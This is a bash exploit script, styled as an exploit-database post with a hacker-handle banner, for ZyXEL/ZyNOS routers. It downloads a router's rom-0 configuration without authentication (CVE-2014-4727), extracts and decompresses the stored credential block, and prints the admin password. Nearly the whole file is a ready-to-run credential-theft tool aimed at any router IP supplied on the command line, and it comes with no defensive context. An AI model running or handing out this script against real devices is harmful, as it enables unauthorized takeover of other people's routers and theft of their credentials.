#!/bin/bash

echo "#### 
# In The Name Of ALLAH
# Exploit Title: Hacking Zynos Router System
# Author: KinG Of PiraTeS
# Facebook Profile: www.fb.me/cr4ck3d
# E-mail: t5r@hotmail.com / cr4ck3d@offdr5cax.dz
# Web Site : www.1337day.com | www.inj3ct0rs.com
# Vendor: http://www.zyxel.com/
# Version: x.x.x
# Security Risk : High
# Tested on: [Windows 7 Edition Intégrale 64bit ] é [ Kali Linux ]
####"

echo " _   _             ____           __  __ 
| | | | ___  _   _/ ___| ___  ___|  \/  |
| |_| |/ _ \| | | \___ \/ __|/ _ \ |\/| |
|  _  | (_) | |_| |___) \__ \  __/ |  | |
|_| |_|\___/ \__,_|____/|___/\___|_|  |_|
                                         "
# =============================================================================
# zyxel_rom0_extract.sh
#
# Downloads and extracts the credentials stored in a ZyXEL router's rom-0
# configuration file (CVE-2014-4727 / ZyNOS unauthenticated config dump).
#
# Usage:
#   ./zyxel_rom0_extract.sh <router-ip> [port]
#
# Dependencies: curl, gcc, dd, strings
# =============================================================================


set -euo pipefail

# -----------------------------------------------------------------------------
# Colour helpers
# -----------------------------------------------------------------------------
RED=$'\e[1;31m'
GRN=$'\e[0;32m'
YLW=$'\e[1;33m'
BLD=$'\e[1;32m'
RST=$'\e[0m'

info()    { printf '%s[*] %s%s\n' "$GRN" "$*" "$RST"; }
success() { printf '%s[+] %s%s\n' "$BLD" "$*" "$RST"; }
warn()    { printf '%s[!] %s%s\n' "$YLW" "$*" "$RST"; }
die()     { printf '%s[-] %s%s\n' "$RED" "$*" "$RST" >&2; exit 1; }

# -----------------------------------------------------------------------------
# Usage / argument validation
# -----------------------------------------------------------------------------
usage() {
    printf 'Usage: %s <router-ip> [port]\n' "$(basename "$0")"
    printf '  router-ip  Target IP address\n'
    printf '  port       HTTP port (default: 80)\n'
    exit 1
}

[[ $# -lt 1 ]] && usage

TARGET_IP="$1"
TARGET_PORT="${2:-80}"
TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}/rom-0"

# -----------------------------------------------------------------------------
# Paths
# -----------------------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXP_SRC="${SCRIPT_DIR}/exp.c"
DECODER_SRC="${SCRIPT_DIR}/RomDecoder.c"
EXP_BIN="${SCRIPT_DIR}/exp"
DECODER_BIN="${SCRIPT_DIR}/RomDecoder"

TMP_DIR="$(mktemp -d /tmp/zyxel_rom0.XXXXXX)"
ROM0="${TMP_DIR}/rom-0"
SPT_DAT="${TMP_DIR}/spt.dat"
LZS_DATA="${TMP_DIR}/data.lzs"

cleanup() { rm -rf "$TMP_DIR"; }
trap cleanup EXIT

# -----------------------------------------------------------------------------
# Dependency checks
# -----------------------------------------------------------------------------
check_deps() {
    local missing=()
    for cmd in curl gcc dd strings; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    [[ ${#missing[@]} -gt 0 ]] && die "Missing required tools: ${missing[*]}"
}

# -----------------------------------------------------------------------------
# Build helper binaries if sources exist
# -----------------------------------------------------------------------------
build_tools() {
    for pair in "${EXP_SRC}:${EXP_BIN}" "${DECODER_SRC}:${DECODER_BIN}"; do
        local src="${pair%%:*}"
        local bin="${pair##*:}"
        if [[ -f "$src" ]]; then
            if [[ ! -x "$bin" || "$src" -nt "$bin" ]]; then
                info "Compiling $(basename "$src") ..."
                gcc -O2 -Wall -o "$bin" "$src" \
                    || die "Compilation failed for $src"
            fi
        elif [[ ! -x "$bin" ]]; then
            die "Neither source ($src) nor binary ($bin) found."
        fi
    done
}

# -----------------------------------------------------------------------------
# Download rom-0
# -----------------------------------------------------------------------------
fetch_rom0() {
    info "Downloading rom-0 from ${TARGET_URL} ..."
    local http_code
    http_code=$(curl --silent --show-error \
                     --connect-timeout 10 \
                     --max-time 30 \
                     --write-out '%{http_code}' \
                     --output "$ROM0" \
                     "$TARGET_URL") \
        || die "curl failed — is the target reachable?"

    [[ "$http_code" == "200" ]] \
        || die "Server returned HTTP ${http_code}. Target may not be vulnerable."

    local rom_size
    rom_size=$(wc -c < "$ROM0")
    info "Downloaded ${rom_size} bytes."
    (( rom_size > 0 )) || die "rom-0 file is empty."
}

# -----------------------------------------------------------------------------
# Extract & decompress the credential block
# -----------------------------------------------------------------------------
extract_password() {
    info "Extracting spt.dat block (offset 8552, 39600 bytes) ..."
    dd if="$ROM0" of="$SPT_DAT" bs=1 skip=8552 count=39600 2>/dev/null \
        || die "dd failed extracting spt.dat"

    info "Extracting compressed credential data ..."
    dd if="$SPT_DAT" of="$LZS_DATA" bs=1 skip=16 count=220 2>/dev/null \
        || die "dd failed extracting LZS payload"

    info "Decompressing and extracting password ..."
    local pass
    pass=$("$EXP_BIN" "$LZS_DATA" 2>/dev/null | strings | head -n 1)

    if [[ -n "$pass" ]]; then
        success "Password: ${pass}"
    else
        warn "Could not extract a printable password from the payload."
    fi
}

# -----------------------------------------------------------------------------
# Full ROM decode
# -----------------------------------------------------------------------------
decode_rom() {
    info "Running full ROM decoder ..."
    "$DECODER_BIN" "$ROM0" || warn "RomDecoder finished with errors."
}

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
main() {
    check_deps
    build_tools
    fetch_rom0
    extract_password
    decode_rom
    success "Done."
}

main "$@"

echo -ne "\e[0;32m[+] terminated }:) By 0x337\e[0m\n";
                    

